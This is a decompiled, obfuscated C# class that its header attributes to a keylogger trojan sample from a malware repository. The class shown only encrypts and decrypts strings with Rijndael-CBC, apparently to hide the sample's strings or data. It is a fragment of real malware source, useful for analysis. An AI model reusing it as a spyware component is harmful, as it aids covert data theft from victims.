// Decompiled with JetBrains decompiler
// Type: ០
// Assembly: dskl, Version=1.71.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5380AAD3-568D-45D6-B9BC-59CE5C1E3490
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Spy.MSIL.KeyLogger.czk-cde7546df369e926f201a20ea21a174728391b0927412058c56dcdd5367e606c.exe

using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

internal static class \u17E0
{
  private static string ᡆᙃ;
  private static string ᡇᙃ;
  private static string ᡈᙃ;
  private static int ᡉᙃ;
  private static string ᡊᙃ;
  private static int ᡋᙃ;

  public static string \u17E6(string plainText)
  {
    do
      ;
    while (false);
    return \u17E0.\u17E6(plainText, \u17E0.ᡆᙃ, \u17E0.ᡇᙃ, \u17E0.ᡈᙃ, \u17E0.ᡉᙃ, \u17E0.ᡊᙃ, \u17E0.ᡋᙃ);
  }

  public static string \u17E2(string plainText)
  {
    do
      ;
    while (false);
    return \u17E0.\u17E2(plainText, \u17E0.ᡆᙃ, \u17E0.ᡇᙃ, \u17E0.ᡈᙃ, \u17E0.ᡉᙃ, \u17E0.ᡊᙃ, \u17E0.ᡋᙃ);
  }

  public static string \u17E6(
    string plainText,
    string passPhrase,
    string saltValue,
    string hashAlgorithm,
    int passwordIterations,
    string initVector,
    int keySize)
  {
    do
      ;
    while (false);
    byte[] bytes1 = Encoding.ASCII.GetBytes(initVector);
    byte[] bytes2 = Encoding.ASCII.GetBytes(saltValue);
    byte[] bytes3 = Encoding.UTF8.GetBytes(plainText);
    byte[] bytes4 = new PasswordDeriveBytes(passPhrase, bytes2, hashAlgorithm, passwordIterations).GetBytes(keySize / 8);
    RijndaelManaged rijndaelManaged = new RijndaelManaged();
    rijndaelManaged.Mode = CipherMode.CBC;
    ICryptoTransform encryptor = rijndaelManaged.CreateEncryptor(bytes4, bytes1);
    MemoryStream memoryStream = new MemoryStream();
    CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, encryptor, CryptoStreamMode.Write);
    cryptoStream.Write(bytes3, 0, bytes3.Length);
    cryptoStream.FlushFinalBlock();
    byte[] array = memoryStream.ToArray();
    memoryStream.Close();
    cryptoStream.Close();
    return Convert.ToBase64String(array);
  }

  public static string \u17E2(
    string cipherText,
    string passPhrase,
    string saltValue,
    string hashAlgorithm,
    int passwordIterations,
    string initVector,
    int keySize)
  {
    do
      ;
    while (false);
    byte[] bytes1 = Encoding.ASCII.GetBytes(initVector);
    byte[] bytes2 = Encoding.ASCII.GetBytes(saltValue);
    byte[] buffer = Convert.FromBase64String(cipherText);
    byte[] bytes3 = new PasswordDeriveBytes(passPhrase, bytes2, hashAlgorithm, passwordIterations).GetBytes(keySize / 8);
    RijndaelManaged rijndaelManaged = new RijndaelManaged();
    rijndaelManaged.Mode = CipherMode.CBC;
    ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor(bytes3, bytes1);
    MemoryStream memoryStream = new MemoryStream(buffer);
    CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Read);
    byte[] numArray = new byte[buffer.Length];
    int count = cryptoStream.Read(numArray, 0, numArray.Length);
    memoryStream.Close();
    cryptoStream.Close();
    return Encoding.UTF8.GetString(numArray, 0, count);
  }

  static \u17E0()
  {
    do
      ;
    while (false);
    \u17E0.ᡆᙃ = ᙵ.ᙔ;
    \u17E0.ᡇᙃ = ᙵ.ᙖ;
    \u17E0.ᡈᙃ = ᙵ.ᙀ;
    \u17E0.ᡉᙃ = 5;
    \u17E0.ᡊᙃ = ᙵ.ᙚ;
    \u17E0.ᡋᙃ = 192;
  }
}
